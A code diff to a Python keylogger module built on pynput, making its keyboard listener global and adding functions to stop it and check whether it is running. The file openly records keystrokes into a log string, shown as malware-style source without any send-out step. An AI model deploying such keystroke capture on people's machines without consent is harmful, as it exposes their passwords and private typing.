@@ -1,9 +1,7 @@
-from datetime import datetime
-
+import sys
 import pynput.keyboard
 
 keys_log = ""
-
 
 def key_pressed(key):
     """
@@ -30,10 +28,17 @@ def get_log():
 
 
 def keylogger_start():
+    global keyboard_listener
     keyboard_listener = pynput.keyboard.Listener(on_press=key_pressed)
     with keyboard_listener:
         keyboard_listener.join()
 
 
-if __name__ == '__main__':
-    keylogger_start()
+def keylogger_stop():
+    global keys_log
+    keys_log = ""
+    keyboard_listener.stop()
+
+
+def is_active():
+    return keyboard_listener.is_alive()
